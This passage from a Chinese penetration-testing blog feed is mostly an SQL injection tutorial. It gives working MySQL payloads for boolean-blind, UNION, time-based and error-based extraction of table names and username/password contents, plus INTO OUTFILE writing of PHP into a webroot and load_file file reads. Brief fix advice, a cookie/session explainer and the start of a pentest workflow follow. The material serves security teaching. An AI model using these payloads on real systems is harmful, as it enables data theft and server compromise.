'123456';</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection28.png" alt></p><p>获取到表的第二个的字段长度为8.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> (<span class="keyword">select</span> <span class="keyword">length</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'admin'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>) = <span class="number">8</span>; <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection29.png" alt></p><p>8、获取当前数据库表的字段的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">ord</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'admin'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>)) = <span class="number">117</span>; <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection30.png" alt></p><p>117对应ASCII码表上的u,以此类推可以得出完整的字段名：username、passwd</p><p>9、获取当前数据库表的字段的内容的长度<br>使用MySQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat() <span class="comment">#用来拼接字符串</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> (<span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">concat</span>(username,passwd)) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>) = <span class="number">13</span>; <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p>用户名和密码的字段长度一共是13位：<br><img src="../do/images/pentest/pentest-sql-injection31.png" alt></p><p>10、获取当前数据库表的字段的内容的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">mid</span>((<span class="keyword">select</span> <span class="keyword">concat</span>(username,passwd) <span class="keyword">from</span> <span class="keyword">admin</span>),<span class="number">1</span>,<span class="number">1</span>) = <span class="string">'a'</span>; <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">ord</span>(<span class="keyword">mid</span>((<span class="keyword">select</span> <span class="keyword">concat</span>(username,passwd) <span class="keyword">from</span> <span class="keyword">admin</span>),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">97</span>; <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p>以此类推，就可以获取内容了。<br><img src="../do/images/pentest/pentest-sql-injection32.png" alt></p><h3 id="联合注入-同时查询"><a href="#联合注入-同时查询" class="headerlink" title="联合注入\同时查询"></a>联合注入\同时查询</h3><p>联合注入步骤如下：<br>1、获取字段的总数<br>2、获取数据库<br>3、获取数据库表<br>4、获取数据库里边的表的字段</p><p>1、获取字段的总数：</p><p>在MySQL下有两个语句是用来排序字段的内容的：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by</span><br><span class="line">group by</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection05.png" alt></p><p>在渗透测试中，这两个语句都可以用来判断字段的总数。</p><p>判断字段的总数：</p><p>这里有3个字段，分别是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | passwd   |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><p>当查询的字段为4或者大于4时，超过了字段总数，就会报错：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">4</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span>;</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection06.png" alt></p><p>通常情况下，网站要获取数据库里边的数据，就会通过数据库里边的ID号来查询，如ID=1，就回取第一行，ID=2就会取第二行。<br><img src="../do/images/pentest/pentest-sql-injection07.png" alt></p><p>获取到字段的长度之后就可以进行联合查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>这里的1,1,1和1,2,3是字段，随便填写，字段的长度要和获取的字段长度一致，否则会报错，无法查询。</p><p><img src="../do/images/pentest/pentest-sql-injection08.png" alt></p><p>2、获取数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection09.png" alt></p><p>除了读取数据库名，还可以用MySQL函数读取其他信息。</p><p>3、获取数据库表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">'test'</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="keyword">database</span>();</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection10.png" alt></p><p>这里的意思是要查询information_schema数据库下的TABLES表，要查询的数据库是test，执行后获取的表名为admin。</p><p>如果字段没有输出结果怎么办呢？正常的查询，会把正确的值查询出来，利用不成立的语句，把正确的信息屏蔽掉，就只剩下我们需要的信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="keyword">database</span>();</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection11.png" alt></p><p>如果数据库有多个表，如何获取其他表呢，这里用到limit语句，下边的语句意思是，从第0条开始获取，只获取1条：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>那么获取第二个表就是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>以此类推。</p><p><img src="../do/images/pentest/pentest-sql-injection12.png" alt></p><p>4、获取数据库表里边的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'admin'</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'admin'</span> <span class="keyword">and</span> table_schema = <span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection13.png" alt></p><p>还可以转换成16进制后查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x61646d696e</span> <span class="keyword">and</span> table_schema = <span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection15.png" alt></p><p>5、获取数据库表里边的字段的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> = <span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> = <span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection14.png" alt></p><h3 id="导出数据库"><a href="#导出数据库" class="headerlink" title="导出数据库"></a>导出数据库</h3><p>在知道绝对路径的情况下，可以导出数据库到指定的文件，达到我们想要的结果。</p><p>导出数据库到网站的路径下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> = <span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'&lt;?php phpinfo(); ?&gt;'</span>,<span class="number">3</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'E:/PHPWAMP_IN2/wwwroot/index.php'</span>;</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection15.png" alt></p><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>在知道绝对路径的情况下，可以读取指定的文件，达到我们想要的结果。</p><p>导出数据库到网站的路径下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> = <span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">load_file</span>(<span class="string">'E:/PHPWAMP_IN2/wwwroot/index.php'</span>);</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection16.png" alt></p><h3 id="延迟注入-定时查询"><a href="#延迟注入-定时查询" class="headerlink" title="延迟注入\定时查询"></a>延迟注入\定时查询</h3><p>和布尔注入一样：<br>1、获取当前数据库长度<br>2、获取当前数据库<br>3、获取当前数据库表的总数<br>4、获取当前数据库表的长度<br>5、获取当前数据库表的内容<br>6、获取当前数据库表的字段的总数<br>7、获取当前数据库表的字段的长度<br>8、获取当前数据库表的字段的内容<br>9、获取当前数据库表的字段的内容的长度<br>10、获取当前数据库表的字段的内容的内容</p><p>获取数据库总数：<br>延迟注入和布尔注入一样，只是多了一个延迟和if判断条件。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>(<span class="number">1</span> = <span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>));</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>(<span class="number">1</span> = <span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection33.png" alt></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span> <span class="keyword">or</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">select</span> <span class="keyword">count</span>(schema_name) <span class="keyword">from</span> information_schema.schemata) = <span class="number">5</span>,<span class="number">0</span>,<span class="number">5</span>)); <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span> <span class="keyword">or</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">select</span> <span class="keyword">count</span>(schema_name) <span class="keyword">from</span> information_schema.schemata) = <span class="number">4</span>,<span class="number">0</span>,<span class="number">5</span>)); <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection34.png" alt><br>可以判断出数据库的总数为4。</p><p>1、获取当前数据库长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span> <span class="keyword">or</span> <span class="keyword">sleep</span>(<span class="keyword">if</span>((<span class="keyword">length</span>(<span class="keyword">database</span>())) = <span class="number">4</span>,<span class="number">0</span>,<span class="number">5</span>)); <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p>可以判断出数据库的长度为4。<br><img src="../do/images/pentest/pentest-sql-injection35.png" alt></p><h3 id="报错注入-信息报错"><a href="#报错注入-信息报错" class="headerlink" title="报错注入\信息报错"></a>报错注入\信息报错</h3><p>只要count()，rand()，group by这三个语句连用，并且数据库的标的字段的内容超过三条，就会造成这种报错。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),<span class="string">','</span>) <span class="keyword">as</span> <span class="keyword">error</span>,<span class="keyword">count</span>(<span class="number">1</span>) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">error</span>;</span><br></pre></td></tr></table></figure><p>只有一条数据的话就不会报错：<br><img src="../do/images/pentest/pentest-sql-injection40.png" alt></p><p>有三条数据或者三条数据以上就会报错：<br><img src="../do/images/pentest/pentest-sql-injection41.png" alt></p><p>查看当前数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),<span class="string">'====&gt;'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>())) <span class="keyword">as</span> <span class="keyword">error</span>,<span class="keyword">count</span>(<span class="number">1</span>) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">error</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),<span class="string">'====&gt;'</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())) <span class="keyword">as</span> <span class="keyword">error</span>,<span class="keyword">count</span>(<span class="number">1</span>) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">error</span>;</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection42.png" alt></p><p>查看当前表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),<span class="string">'====&gt;'</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">as</span> <span class="keyword">error</span>,<span class="keyword">count</span>(<span class="number">1</span>) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">error</span>;</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection43.png" alt></p><p>查看当前表的字段的内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),<span class="string">'====&gt;'</span>,(<span class="keyword">select</span> <span class="keyword">concat</span>(username,<span class="string">','</span>,passwd) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">as</span> <span class="keyword">error</span>,<span class="keyword">count</span>(<span class="number">1</span>) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">error</span>;</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection44.png" alt></p><p>函数报错：</p><p>updatexml()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span> <span class="keyword">or</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)); <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span> <span class="keyword">or</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)); <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span> <span class="keyword">or</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)); <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span> <span class="keyword">or</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">concat</span>(username,<span class="string">','</span>,passwd) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)); <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection45.png" alt></p><p>extractvalue()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)); <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection46.png" alt></p><p>等等还有其他函数<del>~</del></p><h3 id="修补方式"><a href="#修补方式" class="headerlink" title="修补方式"></a>修补方式</h3><p>SQL注入分为int型和字符型两大类。<br>1、字符型在PHP下可以使用addslashes进行转义<br>2、int型直接在传参的地方+0<br>3、可以对用户输入的字符进行过滤或者转义<br>4、SQL语句参数化</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>如果按照上边的方式对SQL注入漏洞进行修复，但是客户端发送的数据字符集是gbk，则可能会导致转义失败，就造成了宽字节注入。<br>测试方式：在原测试的基础上，把闭合的单引号修改成%df%27</p><h3 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h3><ul><li>添加型注入</li><li>删除型注入</li><li>修改型注入</li></ul><p>常出现在POST请求中，在测试中我只碰到过一次添加型注入。</p><h3 id="其他数据库"><a href="#其他数据库" class="headerlink" title="其他数据库"></a>其他数据库</h3><p>其他数据库的注入语句也差不多。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-cookie与session</title>
      <link href="/article/pentest-cookie-session.html"/>
      <url>/article/pentest-cookie-session.html</url>
      
        <content type="html"><![CDATA[<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>cookie是服务器在客户端上存储的小段文本,主要内容包括：名字，值，过期时间，路径和域。在发送每一个请求的时候，一起发送到服务器，是在客户端保持状态的方案。</p><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>客户端向服务器发送请求的同时，会携带一个空的cookie,服务器会获取cookie的值，如果获取不到会自动生成一个session，保存在服务器上，同时把session返回到客户端，浏览器会保存下来。<br>当下一次客户端向服务器发送请求的的时候，会自动携带保存的cookie，服务器会解析这个session的ID，然后查找已经保存的session文件，如果匹配就验证成功。</p><p>如：</p><p>当访问服务器后，服务器会生成一个session文件，并响应客户端的请求，返回一个session：</p><p><img src="../do/images/pentest/pentest-session04.png" alt></p><p>如果在本地修改了cookie，再次发送请求之后，服务器也会生成同样的session文件。<br><img src="../do/images/pentest/pentest-session05.png" alt></p><h3 id="cookie跨域"><a href="#cookie跨域" class="headerlink" title="cookie跨域"></a>cookie跨域</h3><p>cookie一般格式：<br>名字,值,有效时间,有效路径,有效域</p><p>默认的，cookie只能对当前域名（完整域名：有效的二级域名）有效。</p><p>cookie跨域：指的是允许cookie在不同的二级域名之间共享。（一级域名一致）</p><p>百度cookie：</p><p>名称：BIDUPSID<br>内容：1CRDAA1B0DFCEDZSDFTFG24CF83342C1<br>有效域：.baidu.com<br>路径：/<br>有效时间：2050年9月15日 0:12:58</p><p><img src="../do/images/pentest/pentest-session01.png" alt></p><p>这里百度的有效域为.baidu.com，在所有的二级域名下，这个cookie都有效。</p><p>如果是这样的，那么第一个cookie只对pan.baidu.com有效，对baidu.com无效。<br><img src="../do/images/pentest/pentest-session02.png" alt></p><p>如果是这样的，只对这个链接有效：baidu.com/eat/，baidu.com不生效。<br><img src="../do/images/pentest/pentest-session03.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-测试</title>
      <link href="/article/pentest-test.html"/>
      <url>/article/pentest-test.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>做了挺久的渗透测试，现在来总结渗透测试的全套流程吧…</p><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>面对一个系统，如何进行渗透测试？</p><h3 id="渗透内容"><a href="#渗透内容" class="headerlink" title="渗透内容"></a>渗透内容</h3><p>我把渗透测试的内容分为三大块：系统安全、应用安全、网络安全，渗透能力有多强，取决于你有没有强大的体系支持。</p><h3 id="渗透强大支持体系"><a href="#渗透强大支持体系" class="headerlink" title="渗透强大支持体系"></a>渗透强大支持体系</h3><p>强大的体系支持是什么？各种牛逼的工具啊？工具从哪来？自己开发啊！</p><h3 id="检测流程"><a href="#检测流程" class="headerlink" title="检测流程"></a>检测流程</h3><h4 id="1、判断网站的框架"><a href="#1、判断网站的框架" class="headerlink" title="1、判断网站的框架"></a>1、判断网站的框架</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Django</span><br><span class="line">ThinkPHP</span><br><span class="line">Struts</span><br></pre></td></tr></table></figure><ul><li>服务器返回的信息、源代码信息、目录结构</li><li>测试框架漏洞</li></ul><h4 id="2、判断网站的CMS"><a href="#2、判断网站的CMS" class="headerlink" title="2、判断网站的CMS"></a>2、判断网站的CMS</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 